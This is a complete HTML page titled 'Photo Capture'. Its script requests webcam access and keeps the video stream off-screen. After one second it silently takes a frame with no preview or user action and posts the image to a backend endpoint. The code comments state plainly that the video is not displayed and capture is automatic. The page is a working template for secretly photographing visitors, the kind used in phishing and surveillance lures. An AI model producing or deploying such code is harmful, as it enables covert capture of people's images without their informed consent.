<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Photo Capture</title>
</head>
<body>
  <h1>Capture Photo</h1>
  <canvas id="canvas" style="display:none;"></canvas> <!-- Hidden canvas to draw the captured photo -->
  <script>
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    // Request access to the webcam and automatically capture a photo after loading
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        // Set up video stream, but don't display it on the page
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        // Capture photo after 1 second (you can adjust this timing)
        setTimeout(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photo = canvas.toDataURL('image/jpeg');  // Get photo as base64
          sendPhoto(photo);  // Send photo to the backend API
        }, 1000);
      })
      .catch(err => {
        console.log("Error accessing webcam: ", err);
      });

    // Function to send the captured photo to the backend
    async function sendPhoto(photo) {
      try {
        const response = await fetch('/api/send-photo', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ photo }),
        });

        const result = await response.json();
        if (result.success) {
          console.log('Photo sent successfully!');
        } else {
          console.log('Failed to send photo:', result.message);
        }
      } catch (error) {
        console.log('Error sending photo:', error);
      }
    }
  </script>
</body>
</html>
